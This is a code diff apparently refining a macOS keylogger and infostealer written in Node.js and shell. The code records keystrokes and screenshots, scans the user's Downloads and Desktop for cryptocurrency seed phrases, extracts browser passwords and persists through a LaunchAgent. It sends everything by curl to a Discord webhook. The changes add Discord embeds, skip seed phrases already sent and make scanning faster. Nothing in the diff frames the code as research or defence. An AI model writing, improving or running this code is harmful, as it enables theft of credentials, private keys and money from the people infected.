@@ -739,49 +739,7 @@ if (!fs.existsSync(screenshotDir)) {
 // Screenshots can be added later if needed, but for now we only send keystrokes
 
 // Upload screenshot directly to Discord as file attachment (not gofile)
-function uploadScreenshotToDiscord(filepath, message, callback) {
-    if (!fs.existsSync(filepath)) {
-        callback(null);
-        return;
-    }
-    
-    // Discord webhook supports file uploads via multipart/form-data
-    // Create a temporary JSON file for payload_json (more reliable than escaping)
-    const payloadFile = path.join(screenshotDir, `discord_payload_${Date.now()}.json`);
-    const payload = { content: message };
-    
-    try {
-        fs.writeFileSync(payloadFile, JSON.stringify(payload));
-        
-        // Upload screenshot + message to Discord using multipart/form-data
-        // Use @ for both files (Discord accepts this format)
-        exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${filepath};type=image/png" "${WEBHOOK}"`, (error, stdout, stderr) => {
-            // Clean up payload file
-            setTimeout(() => {
-                try { fs.unlinkSync(payloadFile); } catch (e) {}
-            }, 5000);
-            
-            if (error) {
-                // Fallback: send text only if file upload fails
-                const textPayload = { content: message + '\n\n⚠️ Screenshot upload failed' };
-                const textFile = path.join(screenshotDir, `discord_text_${Date.now()}.json`);
-                try {
-                    fs.writeFileSync(textFile, JSON.stringify(textPayload));
-                    exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
-                        setTimeout(() => {
-                            try { fs.unlinkSync(textFile); } catch (e) {}
-                        }, 5000);
-                    });
-                } catch (e) {}
-                callback(null);
-            } else {
-                callback('uploaded');
-            }
-        });
-    } catch (e) {
-        callback(null);
-    }
-}
+// REMOVED: uploadScreenshotToDiscord - now handled directly in sendKeylogToDiscord with embeds
 
 // Send keylog to Discord with screenshot (screenshot sent directly as file, not gofile)
 function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
@@ -799,35 +757,47 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    const keylogContent = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⌨️ **Keylogger**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\`\`\`\n${buffer.substring(0, 1000)}\n\`\`\`\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\`\n**Time:** \`${new Date().toLocaleString()}\``;
+    // Use Discord embed for keylogger
+    const keylogContent = {
+        embeds: [{
+            title: "⌨️ Keylogger",
+            color: 0x0099ff,
+            description: `\`\`\`\n${buffer.substring(0, 1000)}\n\`\`\``,
+            fields: [
+                { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
+                { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
+                { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
+                { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
     
     // If we have a screenshot, upload it directly to Discord as file attachment
     if (screenshotFilePath && fs.existsSync(screenshotFilePath)) {
-        uploadScreenshotToDiscord(screenshotFilePath, keylogContent, (result) => {
-            // Screenshot uploaded, clean up after delay
-            setTimeout(() => {
-                try { fs.unlinkSync(screenshotFilePath); } catch (e) {}
-            }, 10000);
-        });
+        const payloadFile = path.join(screenshotDir, `keylog_payload_${Date.now()}.json`);
+        try {
+            fs.writeFileSync(payloadFile, JSON.stringify(keylogContent));
+            exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${screenshotFilePath};type=image/png" "${WEBHOOK}"`, (error) => {
+                setTimeout(() => {
+                    try { 
+                        fs.unlinkSync(payloadFile);
+                        fs.unlinkSync(screenshotFilePath);
+                    } catch (e) {}
+                }, 10000);
+            });
+        } catch (e) {}
     } else {
-        // No screenshot - just send text
-        const payload = {
-            content: keylogContent
-        };
-        
+        // No screenshot - just send embed
         const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
         try {
-            fs.writeFileSync(payloadFile, JSON.stringify(payload));
+            fs.writeFileSync(payloadFile, JSON.stringify(keylogContent));
             exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
                 setTimeout(() => {
                     try { fs.unlinkSync(payloadFile); } catch (e) {}
                 }, 5000);
             });
-        } catch (e) {
-            // Fallback
-            const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}`;
-            exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${msg.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"}' "${WEBHOOK}"`, () => {});
-        }
+        } catch (e) {}
     }
 }
 
@@ -893,6 +863,7 @@ setInterval(() => {
 // Only checks .txt files for seed phrases - works anywhere!
 // Uses fs.watch (NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!)
 let watchedFiles = new Set(); // Track files we've already sent
+let sentSeedPhrases = new Set(); // Track seed phrases we've already sent (prevent duplicates)
 let watchDirs = [
     path.join(os.homedir(), 'Downloads'),
     path.join(os.homedir(), 'Desktop'),
@@ -1411,51 +1382,62 @@ function sendFileToDiscord(filepath, filename, analysis) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    // Build modern clean Discord message with visual formatting
+    // Build Discord embed for seed phrase (better formatting)
     const seedPhrases = analysis.detected.filter(d => d.type === 'seed_phrase');
     
     // Only send if we found actual seed phrases
     if (seedPhrases.length === 0) return;
     
-    let message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔐 **Seed Phrase Detected**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    // Check for duplicates - only send if we haven't seen this seed phrase before
+    const seedPhraseText = seedPhrases[0].words.join(' ');
+    const seedPhraseHash = seedPhraseText.toLowerCase().replace(/\s+/g, ' ');
+    if (sentSeedPhrases.has(seedPhraseHash)) return; // Already sent this seed phrase
+    sentSeedPhrases.add(seedPhraseHash);
     
-    // Seed phrase content (clean format)
-    seedPhrases.forEach((item) => {
-        message += `\`\`\`\n${item.words.join(' ')}\n\`\`\`\n\n`;
-    });
+    // Get full file path (show where it was found)
+    const fullPath = filepath.replace(os.homedir(), '~');
+    const folderPath = path.dirname(fullPath);
     
-    // System info (clean format with separator)
-    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💻 **System Info**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-    message += `**Hostname:** \`${HOSTNAME}\`\n`;
-    message += `**PC Username:** \`${USERNAME}\`\n`;
-    message += `**IP Address:** \`${ipAddress}\`\n`;
-    message += `**File:** \`${filename}\`\n`;
-    message += `**Time:** \`${new Date().toLocaleString()}\``;
+    // Use Discord embed
+    const message = {
+        embeds: [{
+            title: "🔐 Seed Phrase Detected",
+            color: 0xff0000,
+            description: `\`\`\`\n${seedPhraseText}\n\`\`\``,
+            fields: [
+                { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
+                { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
+                { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
+                { name: "File", value: `\`${filename}\``, inline: true },
+                { name: "Location", value: `\`${folderPath}\``, inline: true },
+                { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
     
-    // Create payload file
+    // Create payload file with embed
     const payloadFile = path.join(screenshotDir, `file_payload_${Date.now()}.json`);
-    const payload = { content: message };
     
     try {
-        fs.writeFileSync(payloadFile, JSON.stringify(payload));
+        fs.writeFileSync(payloadFile, JSON.stringify(message));
         
-        // Send file + message to Discord
+        // Send file + embed to Discord
         exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${filepath}" "${WEBHOOK}"`, (error) => {
             setTimeout(() => {
                 try { fs.unlinkSync(payloadFile); } catch (e) {}
             }, 5000);
         });
     } catch (e) {
-        // Fallback: send text only
-        const textPayload = { content: message };
+        // Fallback: send embed only
         const textFile = path.join(screenshotDir, `file_text_${Date.now()}.json`);
         try {
-            fs.writeFileSync(textFile, JSON.stringify(textPayload));
+            fs.writeFileSync(textFile, JSON.stringify(message));
             exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
                 setTimeout(() => {
                     try { fs.unlinkSync(textFile); } catch (e) {}
                 }, 5000);
-                });
+            });
         } catch (e2) {}
     }
 }
@@ -1568,13 +1550,13 @@ setTimeout(() => {
 setTimeout(() => {
     setInterval(() => {
         watchDirs.forEach(watchDir => {
-            // Run scan in background (non-blocking)
+            // Run scan in background (non-blocking, async)
             setImmediate(() => {
                 scanDirectoryRecursive(watchDir);
             });
         });
-    }, 60000); // Scan every 60 seconds (less frequent, faster overall)
-}, 30000); // Wait 30 seconds before first scan (let keylogger start first)
+    }, 30000); // Scan every 30 seconds (faster detection)
+}, 10000); // Wait 10 seconds before first scan (let keylogger start first)
 
 // PASSWORD EXTRACTION - Extracts Firefox, Chrome, Safari passwords + system info
 function extractPasswords() {
@@ -1718,7 +1700,20 @@ main
                         const browserList = browsers.length > 0 ? browsers.join(', ') : 'Unknown';
                         
                         // Create modern message
-                        const message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔐 **Browser Passwords**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n**Collected From:** \`${browserList}\`\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💻 **System Info**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\`\n**Time:** \`${new Date().toLocaleString()}\``;
+                        const message = {
+                            embeds: [{
+                                title: "🔐 Browser Passwords",
+                                color: 0xff9900,
+                                fields: [
+                                    { name: "Collected From", value: `\`${browserList}\``, inline: false },
+                                    { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
+                                    { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
+                                    { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
+                                    { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
+                                ],
+                                timestamp: new Date().toISOString()
+                            }]
+                        };
                         
                         // Send to Discord with file attachment
                         const payloadFile = path.join(screenshotDir, `password_extract_${Date.now()}.json`);
@@ -1787,8 +1782,20 @@ setInterval(() => {
         if (ipAddress !== 'Unknown') break;
     }
 
+    // Use Discord embed for better formatting
     const startupPayload = {
-        content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ **Keylogger Started Successfully**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\`\n**Status:** \`Running 24/7\`\n**Timestamp:** \`${new Date().toLocaleString()}\``
+        embeds: [{
+            title: "✅ Keylogger Started Successfully",
+            color: 0x00ff00,
+            fields: [
+                { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
+                { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
+                { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
+                { name: "Status", value: "`Running 24/7`", inline: true },
+                { name: "Timestamp", value: `\`${new Date().toLocaleString()}\``, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+        }]
     };
     const startupFile = path.join(screenshotDir, `startup_${Date.now()}.json`);
     try {
@@ -1866,19 +1873,9 @@ PLISTEOF
     launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null
     launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null
     
-    # Wait a moment then start it
+    # Wait a moment then start it (ONLY via LaunchAgent - no duplicate!)
     sleep 2
     launchctl start com.keylogger.helper 2>/dev/null || true
-    
-    # Also start it directly as backup (in case LaunchAgent fails)
-    (cd "$APP_DIR" && nohup "$NODE_PATH" keylogger-screenshotter.js >/dev/null 2>&1 &)
-    
-    # Verify it's running
-    sleep 1
-    if ! pgrep -f "keylogger-screenshotter.js" >/dev/null 2>&1; then
-        # If not running, try starting again
-        (cd "$APP_DIR" && nohup "$NODE_PATH" keylogger-screenshotter.js >/dev/null 2>&1 &)
-    fi
     
     # Keylogger startup message is sent by the JS script itself (no duplicate needed)
 }
